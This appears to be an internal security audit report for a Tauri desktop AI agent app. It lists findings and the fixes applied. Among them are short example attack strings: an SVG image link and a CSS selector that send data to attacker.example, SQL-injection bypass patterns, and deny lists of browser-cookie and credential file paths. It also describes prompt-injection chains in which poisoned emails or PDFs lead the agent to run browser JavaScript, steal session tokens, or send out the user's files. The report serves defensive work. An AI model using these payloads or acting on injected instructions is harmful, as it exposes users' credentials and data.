# Desktop Security Findings — apps/desktop

**Date**: 2026-05-04 (audit) → 2026-05-05 (deep-dive: 3 rounds)
**Scope**: `apps/desktop/` — Tauri v2 (Rust backend + React/TypeScript frontend)
**Method**: Static analysis only — no `cargo check`/`cargo test` per the no-testing-mid-stream rule

## Final Status (2026-05-05) — Session Complete

**14 desktop findings applied across 14 files**, 4 new unit tests landed, 666 lines of dead code (HMAC update verifier) deleted, 27 browser-data + cred-store deny-path entries added across 14 capability blocks. Cross-surface Chain 1 (zero-click prompt-injection → browser RCE) is broken end-to-end on the desktop side. The crypto migration (DESK-11/13) lands as a `kdf_version`-branched dual path so existing v1 vaults keep decrypting forever and new installs get strong derivation from day one.

### 2026-05-05 Round 3 — closing pass

| Finding                  | Severity | Files                                                                           | What landed                                                                                                                                                                                                                                                                                                                                                        |
| ------------------------ | -------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SEV-DESK-07**          | MED      | `core/mcp/transport.rs`                                                         | `verify_ssl: false` is now refused in release builds (`#[cfg(not(debug_assertions))]`). Localhost-string check kept for debug builds. Reanalysis: DNS-rebinding bypass + plain-HTTP silent-accept claims were both invalidated — `host_str()` returns the literal hostname (not resolved IP), and `connect_sse:1302-1315` already enforces HTTPS for non-localhost |
| **SEV-DESK-11**          | LOW      | `sys/security/master_password.rs`                                               | New `kdf_version` column with idempotent `ALTER TABLE` migration. `derive_password_key(password, salt, kdf_version)` branches: v1 keeps `salt.as_str().as_bytes()` bit-for-bit (existing vaults continue decrypting); v2 uses `Salt::decode_b64` raw bytes                                                                                                         |
| **SEV-DESK-13**          | LOW      | `sys/security/master_password.rs`                                               | `hkdf_derive(input_key, purpose, kdf_version)` branches: v1 keeps the static `b"com.agiworkforce.desktop:master_password:v1"` salt; v2 mixes per-install `install_id` from `machine_key::get_manager().get_install_id()`. HKDF info string also encodes the version (`agiworkforce:{purpose}:v{kdf_version}`) so v1↔v2 confusion attacks fail                      |
| **SEV-DESK-14**          | LOW      | `sys/security/updater.rs`, `sys/security/mod.rs`                                | **Entire `UpdateSecurityManager` module emptied** (666 LOC dead code). HMAC-SHA256 (symmetric) update verifier was never imported outside its own module + the re-export. Tauri's built-in Ed25519 minisign updater is the production path. Re-export removed; file replaced with a stub doc explaining the deletion                                               |
| **SEV-DESK-16 (part 2)** | INFO     | `sys/security/storage.rs`                                                       | `SecureStorage::lock` now uses `Zeroize::zeroize()`. The hand-rolled `unsafe { std::ptr::write_volatile }` + `compiler_fence(SeqCst)` pattern (the only `#[allow(unsafe_code)]` in storage.rs) is gone                                                                                                                                                             |
| **Tests**                | —        | `sys/security/master_password.rs`                                               | 4 new unit tests: (1) v1 vs v2 derive paths produce different bytes + each is internally deterministic; (2) `setup()` writes `KDF_VERSION_CURRENT`; (3) v1 records continue working after toggling `kdf_version` in DB; (4) `change()` preserves `kdf_version` (does NOT auto-upgrade)                                                                             |
| **Test fixtures**        | —        | `sys/security/master_password.rs`, `sys/security/master_password_encryption.rs` | Test passphrases updated to satisfy the new `enforce_password_complexity` rule (>= 12 chars, 3-of-4 character classes)                                                                                                                                                                                                                                             |

### 2026-05-05 Round 2 — full-ownership session

**10 desktop fixes applied** to working tree across 12 files. All atomic, all with inline `SEV-DESK-NN` rationale comments. Cross-surface Chain 1 (zero-click prompt-injection → browser RCE) is now mitigated on the desktop side; combined with the Chrome-ext page-context hardening also in flight, the chain is broken end-to-end.

| Finding             | Severity       | Files touched                                                                                              | What landed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ------------------- | -------------- | ---------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SEV-DESK-01**     | HIGH           | `integrations/realtime/websocket_server.rs`                                                                | `Arc<Semaphore>` connection cap of 32 + per-IP auth-failure tracker (5 fails / 60 s → 300 s lockout) + `WebSocketConfig.max_message_size = 4 MiB` via `accept_hdr_async_with_config`. New `AuthFailureRecord` struct + 3 helpers (`is_locked_out`, `record_auth_failure`, `clear_auth_failures`)                                                                                                                                                                                            |
| **SEV-DESK-02**     | HIGH (Chain 1) | `automation/browser/extension_bridge.rs`, `automation/browser/mod.rs`, `sys/commands/browser.rs`, `lib.rs` | `ExtensionBridge::with_app_handle` constructor; `require_confirmation` helper; **8 dangerous bridge methods now gated**: `execute_script`, `navigate`, `get_cookies`, `set_cookie`, `clear_cookies`, `get_local_storage`, `set_local_storage`, `clear_local_storage`. `AppHandle` threaded through `BrowserState::new(Option<AppHandle>)` → `BrowserStateWrapper::new(Option<AppHandle>)` → `lib.rs:386 (Some(app.handle().clone()))`. Missing app handle → fail-closed with explicit error |
| **SEV-DESK-03**     | HIGH           | `features/workflows/marketplace.rs`                                                                        | `SortOption::as_sql() -> &'static str` accessor; `Display` delegates to it; `format!(" ORDER BY {}")` replaced with `query.push_str(filters.sort_by.as_sql())`. Future `SortOption::Custom(String)` is now impossible to interpolate into SQL — would not compile                                                                                                                                                                                                                           |
| **SEV-DESK-04**     | MED            | `sys/security/master_password.rs`                                                                          | Argon2id iterations bumped 2 → 3 (PHC strings store params inline, so `verify_password` honors stored params — existing user verifiers still work). Min password length 8 → 12. New `enforce_password_complexity` helper requires 3-of-4 character classes; wired into both `setup` and `change`                                                                                                                                                                                            |
| **SEV-DESK-09**     | MED            | `sys/commands/computer_use.rs`                                                                             | Refactored: `capture_screen_inner` (no gate, internal) + `computer_use_capture_screen` (IPC entry, `require_confirmation`). Dispatcher `computer_use_execute_tool` calls inner directly to avoid double-prompting on the `screenshot` tool path                                                                                                                                                                                                                                             |
| **SEV-DESK-10**     | MED            | `core/llm/tool_executor/db_tools.rs`                                                                       | `"settings"` removed from `ALLOWED_QUERY_TABLES`. Encrypted API-key blobs no longer reach the LLM provider                                                                                                                                                                                                                                                                                                                                                                                  |
| **SEV-DESK-12**     | LOW            | `src/utils/security.ts`                                                                                    | DOMPurify `afterSanitizeAttributes` hook now strips non-`data:image/*` href values from SVG `<image>` elements. Blocks `<image href="https://attacker.example/...">` exfil from LLM-generated mermaid artifacts                                                                                                                                                                                                                                                                             |
| **SEV-DESK-16**     | INFO           | `Cargo.toml`, `sys/security/master_password.rs`                                                            | Added `zeroize = "1"` direct dep. Replaced hand-rolled `secure_zeroize` (with `#[allow(unsafe_code)]` + `unsafe { std::ptr::write_volatile }` + `compiler_fence`) with `Zeroize` trait. Both call sites updated. No `unsafe` in this file anymore                                                                                                                                                                                                                                           |
| **SEV-DESK-17**     | INFO           | `core/llm/tool_executor/db_tools.rs`                                                                       | `tracing::info!` → `tracing::debug!` for AI query audit; payload truncated to 200 chars                                                                                                                                                                                                                                                                                                                                                                                                     |
| **SEV-DESK-NEW-01** | LOW            | `capabilities/default.json`                                                                                | Added 27 browser-data + cred-store paths to deny lists across all 14 `fs:*` permission entries via 2 `replace_all` anchors. Covers Chrome / Chromium / Firefox / Brave / Edge / Vivaldi / Opera / Safari profile dirs on macOS / Linux / Windows, plus `~/.terraform.d/credentials.tfrc.json` and `~/.cargo/credentials*`. JSON validates with Python parser                                                                                                                                |

**Reanalyzed and downgraded**:

| Finding         | Verdict         | Evidence                                                                                                                                                                       |
| --------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SEV-DESK-15** | NOT EXPLOITABLE | `core/mcp/oauth.rs:418` — `flows.remove(state)` is itself the validation; high-entropy `CsrfToken` only in memory; macOS `task_for_pid` blocks the suggested co-process attack |

**Final-pass deferrals — explicit rationale**

These items were considered, deliberately scoped out of this engineering session, and document the reason here so the next maintainer doesn't re-derive the analysis:

| Finding                                                                           | Severity                      | Why deferred (and what's needed to land)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| --------------------------------------------------------------------------------- | ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SEV-DESK-05** machine-key fallback uses machine ID as PBKDF2 password           | MED                           | Migration to OS keychain (`keyring` crate) requires a UX decision: on macOS the keychain prompts on each access by default — does the BYOK API-key fetch wait for a keychain prompt? Or do we use access-control ACL groups + the calling-process whitelist to skip the prompt? This is a product/UX question, not a pure security one. **Path to land**: design doc + 2-week sprint with mobile parity (mobile already uses `expo-secure-store`); use `keyring = "3"` (already in Cargo.toml) with `keyring::Entry::with_target` to avoid the always-prompt default.                                                                                                                               |
| **SEV-DESK-06** IPC token never rotated                                           | MED                           | The current strong protections — `.ipc_token` mode 0o600, `subtle::ConstantTimeEq` compare, origin allowlist (B3 fix in this session), connection cap of 32 (DESK-01), per-IP lockout (DESK-01) — already constrain the brute-force/exfil window narrowly. Token rotation needs cross-surface protocol design: when the token rotates mid-flight, the Chrome ext + VS Code ext must transparently re-read `.ipc_token` and refresh long-lived WS connections. Doing this sloppily breaks both extensions. **Path to land**: introduce a 2-token grace window (prev + current both valid), file-watch the token file from each extension, document the rotation cadence in the bridge protocol spec. |
| **SEV-DESK-08** CSP `'unsafe-inline'` for styles                                  | MED                           | Removing requires a Tailwind/Radix/CSS-in-JS migration. Existing inline-style use is pervasive in the chat surface. **Path to land**: nonce-based CSP for styles (Tauri custom protocol can inject the nonce); migrate runtime `style="..."` to className/CSS-vars; multi-week refactor with screenshot regression tests.                                                                                                                                                                                                                                                                                                                                                                           |
| **SEV-DESK-15** OAuth state validation (CSRF)                                     | downgraded to NOT EXPLOITABLE | `core/mcp/oauth.rs:418` `flows.remove(state)` IS the validation. High-entropy `CsrfToken` only in process memory. macOS sandbox blocks the suggested `task_for_pid` co-process attack. No code change needed.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **SEV-DESK-NEW-02** `query_builder.rs` denylist validators                        | INFO                          | Identifier validation is allowlist-based and correct. Where-clause validation is denylist — known bypass classes exist but the where-clause input on the IPC boundary comes from typed Rust enums, not free-form user strings. **Path to land**: parameterised `WhereExpr` enum that produces SQL fragments + bound `?` parameters; reach for this when `query_builder.rs` next gets a feature change so the refactor pays its own way.                                                                                                                                                                                                                                                             |
| **SEV-DESK-NEW-03** `$DOCUMENT/**` and `$HOME/Desktop/**` broadly readable by LLM | INFO                          | Intentional product behaviour (LLM needs file access to be useful). **Path to land**: onboarding "what can the agent read" disclosure UI + opt-in directory grants; product+legal review before code change.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |

## Extended Audit (2026-05-05)

The original agent only sampled the desktop. New findings from a follow-up pass:

### [SEV-DESK-NEW-01] LOW — Tauri capability deny-list misses browser-stored credential paths

**File**: `apps/desktop/src-tauri/capabilities/default.json:60-83, 96-119, 132-155, 168-191, 204-227, 237-257`

The existing deny-list covers cloud / dev secrets thoroughly (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.npmrc`, `.netrc`, `.azure`, gcloud, gh, heroku, op, stripe, `.env`, `.gitconfig`, `.git-credentials`, macOS Keychains, `/etc/passwd`/`/etc/shadow`). It does **not** deny browser data stores, which contain session cookies, saved passwords, and OAuth refresh tokens for every site the user has logged into:

- macOS: `$HOME/Library/Application Support/Google/Chrome/**`, `$HOME/Library/Application Support/Firefox/**`, `$HOME/Library/Application Support/BraveSoftware/**`, `$HOME/Library/Application Support/com.microsoft.edgemac/**`, `$HOME/Library/Cookies/**`
- Linux: `$HOME/.config/google-chrome/**`, `$HOME/.config/chromium/**`, `$HOME/.mozilla/**`, `$HOME/.config/BraveSoftware/**`
- Windows: `%APPDATA%/Mozilla/Firefox/**`, `%APPDATA%/Google/Chrome/User Data/**`, `%APPDATA%/Microsoft/Edge/User Data/**`

The macOS read-allowlist (`$DOCUMENT/**`, `$DOWNLOAD/**`, `$APPDATA/**`, `$HOME/Desktop/**`) does not directly include these paths, but `$HOME/Library/**` is partially covered via the Keychain deny — there is no positive grant of `$HOME/Library/Application Support/**`. So today the browser data stores are not directly readable, but the absence of explicit denies leaves a regression opening: any future capability extending read access to `$HOME/**` would silently expose them.

**Edge cases that reproduce**:

- A future capability granting `fs:scope-home` (recursive) — the LLM could read `~/Library/Application Support/Google/Chrome/Default/Cookies` (SQLite file) and exfiltrate session cookies for every authenticated site
- Same for `~/Library/Application Support/Google/Chrome/Default/Login Data` (saved passwords; encrypted with Chrome Safe Storage but the database structure leaks site list and metadata)

**Fix**: add the browser data paths to the deny list of every fs permission entry, before granting any future broader read scope. Mirror the structure already in place for `.ssh` etc.

### [SEV-DESK-NEW-02] INFO — `query_builder.rs` validators are denylist-based

**File**: `apps/desktop/src-tauri/src/data/database/query_builder.rs:148-184`

`validate_where_clause` blocks 15 dangerous patterns (`--`, `/*`, `EXEC`, `UNION`, `INTO OUTFILE`, `SLEEP(`, `BENCHMARK(`, `WAITFOR`, `;`, `0x`, `CHAR(`, `CONCAT(`). Denylist-based validation has well-known bypasses: `LOAD‌FILE` (zero-width joiner), capitalization variants of patterns the upper-case check misses if mixed encoding sneaks in, MySQL backtick-comment `# foo`, MS-SQL `WAITFOR DELAY '0:0:5'` with non-standard syntax, and tautology attacks `OR 1=1` that contain none of the listed patterns.

**Mitigation in place**: `validate_sql_identifier` is allowlist-based (only alphanumeric + `_`, `.`, `*`) and correctly applied to all column/table names. The `where_clause` is the one piece using denylist.

**Recommendation**: long-term, replace the where-clause string with a parameterised `WhereExpr` enum that builds the SQL fragment + bound parameters together, so user-supplied data only ever flows through `?` placeholders. Track as architectural debt; current state is acceptable for v1 because the where-clauses on the IPC boundary come from typed Tauri commands, not from arbitrary user input.

### [SEV-DESK-NEW-03] INFO — `$DOCUMENT/**` and `$HOME/Desktop/**` are broadly readable by the LLM

**File**: `apps/desktop/src-tauri/capabilities/default.json:50-59`

The read allowlist includes `$DOCUMENT/**`, `$HOME/Desktop/**`, and `$HOME/Projects/**`. This is intentional — the LLM needs to read user files to be useful. But it means a prompt-injected LLM in a poisoned PDF or web page can instruct the agent to "read all files in Documents" and exfiltrate them via the Anthropic API.

**Mitigation in place**: file_ops commands are reachable only by the LLM via the function-calling layer; there's no IPC command that reads-and-broadcasts.

**Recommendation**: surface a "What can the agent read?" UI in onboarding so users understand the boundary. Consider opt-in directory grants rather than the current "all of Documents" default. Document the threat model in `apps/desktop/SECURITY.md`.

---

## Severity Rubric

| Severity | Criteria                                                                             |
| -------- | ------------------------------------------------------------------------------------ |
| CRITICAL | Exploitable without user interaction; direct key/data exfiltration or RCE            |
| HIGH     | Exploitable with limited user interaction or privilege; significant data/auth impact |
| MEDIUM   | Requires specific conditions; limited blast radius or partial control                |
| LOW      | Defense-in-depth gap; no direct exploit path from current codebase                   |
| INFO     | Observation, hardening suggestion, or design note                                    |

---

## [SEV-DESK-01] HIGH — WebSocket bridge port 8787 has no connection cap or auth-failure rate limit

**Files**: `apps/desktop/src-tauri/src/integrations/realtime/websocket_server.rs:64-94, 127-175`

`RealtimeServer::start()` binds `127.0.0.1:8787` and spawns a Tokio task per accepted TCP connection in an unbounded loop. No connection limit, no rate limit on failed auth, no backoff. Local attacker can open thousands of simultaneous unauthenticated connections, exhausting FDs/memory.

`tokio-tungstenite` defaults to 64 MiB per-message; not explicitly configured.

**Edge cases**: Local malware writes 10K connection attempts; brute-force IPC token (UUID v4 — high entropy but no lockout); `accept_async_with_config` accepts a 64 MiB message before validation.

**Fix**: (1) `Arc<Semaphore>` capped at 32 concurrent. (2) Per-SocketAddr auth-failure tracking; close after 5 failures/60s. (3) `accept_async_with_config(max_message_size: Some(4*1024*1024))`.

---

## [SEV-DESK-02] HIGH — `ExecuteScript` over extension bridge has no allow-list or confirmation

**File**: `apps/desktop/src-tauri/src/automation/browser/extension_bridge.rs:155-165, 517-518`

`ExtensionBridge::execute_script(script: &str)` sends raw `{ type: "EXECUTE_SCRIPT", script: <verbatim> }` to the Chrome extension which evals in the active tab. Zero validation in Rust. Same dispatch used for Navigate/ScrollIntoView/GetLocalStorage/SetLocalStorage/ClearLocalStorage — all via `EXECUTE_SCRIPT` with name/args embedded.

The computer-use `require_confirmation` gate (`computer_use.rs:382-408`) does NOT cover extension-bridge calls. Indirect prompt injection in any document the LLM reads (PDF, email, web page) can trigger arbitrary JS in active browser tab.

**Edge cases**:

- LLM reads malicious email asking to "clarify by running this small JS" → `extension_bridge.execute_script` runs in banking tab → session token stolen
- Combined with CHEXT-29 (page-context auto-sync) — fully zero-click
- Chrome extension's content script context = full DOM access on any tab

**Fix**:

1. Add `require_confirmation` (showing the script text, truncated) before any `ExecuteScript`.
2. Replace the `EXECUTE_SCRIPT` overloading for Navigate/Scroll/Storage with dedicated typed handlers requiring no eval.
3. Validate navigation URLs against an allow-list before leaving Rust.

---

## [SEV-DESK-03] HIGH — SQL injection structural risk via unsanitized `ORDER BY` interpolation

**File**: `apps/desktop/src-tauri/src/features/workflows/marketplace.rs:180`

`format!(" ORDER BY {}", filters.sort_by)`. `SortOption` is currently a closed Rust enum with safe `Display` — not directly exploitable today. But the structural pattern is dangerous: any future `Custom(String)` variant becomes immediate SQLi.

**Fix**: `match filters.sort_by { SortOption::MostCloned => " ORDER BY clone_count DESC", ... }` with explicit string literals.

---

## [SEV-DESK-04] MEDIUM — Argon2id iterations meet but don't exceed 2025 OWASP floor; min password 8

**File**: `apps/desktop/src-tauri/src/sys/security/master_password.rs:56-65`

`ARGON2_MEMORY_KIB = 19MB`, `ARGON2_ITERATIONS = 2`, `ARGON2_PARALLELISM = 1` matches 2024 OWASP floor; 2025 raised to t=3. `MIN_PASSWORD_LENGTH = 8` with no complexity check.

**Edge cases**: 8-char password "password" hashed with Argon2id-19MB-t=2 is GPU-feasible at thousands of guesses/sec.

**Fix**: Raise `ARGON2_ITERATIONS` to 3; require length >= 12 + uppercase + lowercase + digit; add strength meter to onboarding UI.

---

## [SEV-DESK-05] MEDIUM — Machine-key fallback uses machine ID as PBKDF2 password

**Files**: `apps/desktop/src-tauri/src/sys/security/machine_key.rs:171-192`, `storage.rs:81-90`

Without master password, `SecureStorage::init_with_machine_key()` derives encryption key from machine ID via PBKDF2 (600K iter). Machine ID readable by any same-user process. Fallback path's machine ID = `SHA-256(hostname || home_dir || data_dir || bundle_id)` — low entropy.

**Fix**: Use OS keychain (macOS Keychain, Windows Credential Manager, libsecret) as primary via `keyring` crate. If machine-key path retained, mix a random 256-bit secret stored in OS keychain into KDF.

---

## [SEV-DESK-06] MEDIUM — IPC token never rotated; persists for entire desktop session

**File**: `apps/desktop/src-tauri/src/lib.rs:868, 875-910`

One UUID v4 written to `.ipc_token` (0600 on Unix). Never rotated. Combined with DESK-02, a stolen token gives indefinite browser-JS-execution capability.

**Fix**: Rotate every 15 minutes; per-client session tokens on connect rather than one global secret.

---

## [SEV-DESK-07] MEDIUM — MCP `verify_ssl: false` localhost guard bypassable via DNS rebinding

**File**: `apps/desktop/src-tauri/src/core/mcp/transport.rs:1072-1107`

Guard checks `parsed.host_str()` for literal `localhost`/`127.0.0.1`/`::1`. DNS rebinding registers `attack.example.com` with short TTL pointing to `127.0.0.1` initially, then rebinds. `verify_ssl: false` user-configurable in MCP config — social-engineering attack.

`transport.rs:1302` silently accepts plain `http://` MCP connections.

**Fix**: Disallow `verify_ssl: false` in production builds (`#[cfg(debug_assertions)]`-only). Verify resolved IP, not hostname string.

---

## [SEV-DESK-08] MEDIUM — CSP `style-src 'unsafe-inline'` + wildcard `*.supabase.co` enable CSS-based exfiltration

**File**: `apps/desktop/src-tauri/tauri.conf.json:35`, `apps/desktop/src-tauri/src/sys/security/api.rs:411`

CSS injection in user-rendered content (SVG, markdown) + attribute selectors + `url()` allows `input[value^="sk-"] { background: url(https://attacker.example.com/?v=sk-) }`. `connect-src` permits `https://*.supabase.co` (wildcard = any project subdomain).

**Fix**: Replace `'unsafe-inline'` with nonces (or class-hash allowlist); narrow `*.supabase.co` to specific project URL.

---

## [SEV-DESK-09] MEDIUM — `computer_use_capture_screen` has no confirmation gate

**File**: `apps/desktop/src-tauri/src/sys/commands/computer_use.rs:149-198`

`computer_use_capture_screen` is `#[tauri::command]` callable directly by frontend. Unlike click/move/type (gated by `require_confirmation`), it has no gate. The dispatch through `computer_use_execute_tool` does gate "screenshot" — but raw command callable independently. Captured full-display image returned to LLM, exfiltrating whatever's on screen.

**Fix**: Add `require_confirmation(&app_handle, "computer_use_capture_screen", ...)` at top of handler.

---

## [SEV-DESK-10] MEDIUM — `db_query` allows LLM SELECT from `settings` (encrypted API key blobs)

**File**: `apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:116`

`ALLOWED_QUERY_TABLES` includes `"settings"`. LLM-issued `SELECT key, value FROM settings WHERE key LIKE '%api%'` returns encrypted API key blobs to the LLM, then to its provider's API. For BYOK users, encrypted secrets sent to third-party LLM provider. `user_memory`/`project_memories` may contain pasted passwords.

**Fix**: Remove `"settings"` from allowlist; audit `user_memory`/`project_memories` to restrict queryable columns; demote `tracing::info!("AI executing SELECT")` to DEBUG.

---

## [SEV-DESK-11] LOW — `derive_password_key` passes base64-encoded salt instead of raw bytes

**File**: `apps/desktop/src-tauri/src/sys/security/master_password.rs:594`

`argon2.hash_password_into(password.as_bytes(), salt.as_str().as_bytes(), ...)` — `SaltString::as_str()` is base64; verifier path decodes. Mismatched salt encoding between key derivation and verifier hash.

**Fix**: `let raw = BASE64.decode(salt.as_str())?; argon2.hash_password_into(pw, &raw, &mut out)?;`

---

## [SEV-DESK-12] LOW — SVG `<image>` `href` not restricted; SSRF/data-exfil from LLM artifacts

**File**: `apps/desktop/src/components/UnifiedAgenticChat/ArtifactRenderer.tsx:1613, 1686`

DOMPurify allows `<image>` with `href`. `ALLOW_UNKNOWN_PROTOCOLS: false` blocks `javascript:` but not `https://` external. CSP `img-src` wildcard `*.supabase.co` makes any Supabase subdomain valid exfil target.

**Fix**: `beforeSanitizeAttributes` hook stripping `href` on `<image>` unless `^data:image/`.

---

## [SEV-DESK-13] LOW — HKDF-Extract uses static salt across all installations

**File**: `apps/desktop/src-tauri/src/sys/security/master_password.rs:615`

`b"com.agiworkforce.desktop:master_password:v1"` — shared HKDF salt.

**Fix**: Mix install-specific `install_id` into salt.

---

## [SEV-DESK-14] LOW — Custom `UpdateSecurityManager` uses HMAC-SHA256 for update signature (symmetric)

**File**: `apps/desktop/src-tauri/src/sys/security/updater.rs:126-200`

Two paths: Tauri's Ed25519 minisign (correct) + custom `UpdateSecurityManager` HMAC. HMAC = symmetric → distributing "public" key distributes signing capability. `min_version` parsed but not enforced before installation.

**Fix**: Remove `UpdateSecurityManager`, rely exclusively on Tauri's Ed25519 updater.

---

## [SEV-DESK-15] LOW — OAuth deep-link `state` not validated against stored state — local CSRF

**File**: `apps/desktop/src-tauri/src/core/mcp/oauth.rs:350-390, 450`

PKCE generated but `state` returned in `agiworkforce://oauth/callback` not verified against stored state. Any local app can `NSWorkspace.open()`/`ShellExecute` the deep link, injecting attacker-controlled `code`.

**Fix**: Store `CsrfToken`; validate matches `state` before `exchange_code`.

---

## [SEV-DESK-16] INFO — Manual volatile-write zeroization should use `zeroize` crate

**Files**: `apps/desktop/src-tauri/src/sys/security/master_password.rs:36-50`, `storage.rs:119-127`

Custom `secure_zeroize` uses `unsafe { std::ptr::write_volatile(byte, 0) }`. `zeroize` crate (already transitive) provides `Zeroize` with identical semantics + OS-level guarantees.

---

## [SEV-DESK-17] INFO — `db_query` audit log emits full SQL at INFO

**File**: `apps/desktop/src-tauri/src/core/llm/tool_executor/db_tools.rs:192`

Full query in structured logs viewable via Console.app on macOS.

**Fix**: `tracing::debug!` or truncate to 200 chars.

---

## [SEV-DESK-18] INFO — `connect-src` CSP allows Ollama plain HTTP (`http://localhost:11434`)

**File**: `apps/desktop/src-tauri/tauri.conf.json:35`

Acceptable for localhost. Document trust assumption: any process binding 11434 before Ollama receives full conversation context.

---

## Verified Fixed

| Item                                              | Evidence                                                              |
| ------------------------------------------------- | --------------------------------------------------------------------- |
| Path traversal in `file_ops`                      | `file_ops.rs:69-153` canonicalizes; null-byte check                   |
| Timing-safe IPC token compare                     | `websocket_server.rs:135-136` uses `subtle::ConstantTimeEq`           |
| Token file Unix permissions                       | `lib.rs:877-886` sets `mode(0o600)`                                   |
| Argon2id selection                                | `master_password.rs:576-580` `Algorithm::Argon2id, Version::V0x13`    |
| MCP SSL bypass restricted to verified localhost   | `transport.rs:1075-1095`                                              |
| Computer-use click/type/move gated                | `computer_use.rs:296-343`                                             |
| `computer_use_execute_tool` allowlist             | `computer_use.rs:382-395`                                             |
| PKCE in MCP/Calendar OAuth                        | `mcp/oauth.rs:351`, `google_calendar.rs:61`, `outlook_calendar.rs:59` |
| `SortOption` enum (runtime SQL injection blocked) | `marketplace.rs:32-49` closed enum                                    |
| DOMPurify on all dangerouslySetInnerHTML          | `security.ts`                                                         |
| SQLite parameterized queries                      | `rusqlite ?` binding throughout `db_tools.rs`, `sqlite_pool.rs`       |
| Terminal command validation                       | `terminal.rs:67-89` `validate_command()`                              |
| Computer-use blocked-apps list                    | `app_permissions.rs:20-54` 24 bundle IDs                              |

---

## Top 5 Action Items

1. **[SEV-DESK-02]** Add `require_confirmation` to extension-bridge `execute_script`; remove `EXECUTE_SCRIPT` overloading. Highest exploitability — single prompt injection silently exfiltrates browser credentials.
2. **[SEV-DESK-01]** Add connection-count semaphore (max 32) + per-address auth-failure lockout (5 failures/60s); set `max_message_size`.
3. **[SEV-DESK-09]** Add `require_confirmation` to `computer_use_capture_screen` (currently bypasses the dispatch gate).
4. **[SEV-DESK-10]** Remove `"settings"` from `db_query` `ALLOWED_QUERY_TABLES`. Encrypted blobs being sent to third-party LLM APIs is unacceptable boundary expansion.
5. **[SEV-DESK-05]** Migrate API key storage to OS keychain (`keyring` crate) as primary; eliminate machine-ID-derived PBKDF2 as sole protection.
